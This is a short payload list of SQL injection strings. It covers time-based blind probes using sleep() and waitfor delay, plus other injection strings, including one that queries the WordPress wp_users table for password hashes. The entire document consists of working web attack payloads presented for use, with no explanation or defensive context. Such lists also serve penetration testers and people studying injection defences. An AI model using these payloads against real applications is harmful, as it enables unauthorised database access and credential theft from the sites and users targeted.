# SQL Injection Payloads
## Time Based SQL Payloads
```sql
'XOR(if(now()=sysdate(),sleep(1*1),0))OR'
')orsleep(5)='
1))orsleep(5)#
"))orsleep(5)="
'))orsleep(5)='
;waitfor delay'0:0:5'--
);waitfor delay'0:0:5'--
';waitfor delay'0:0:5'--
";waitfor delay'0:0:5'--
');waitfor delay'0:0:5'--
");waitfor delay'0:0:5'--
));waitfor delay'0:0:5'--
{"param":"1")))+MySQL_payload--+--}
```
## Other SQL Injection Payloads
```sql
+OR+1=insert(1,1,1,1)--
+OR+1=replace(1,1,1)--
{`foo`/*bar*/(select+1)\}'
{`foo`/*bar*/(select%2b2)}
{`foo`/*bar*/(select+1+from+wp_users+where+user_pass+rlike+"(^)[$].*"+limit+1)}
```
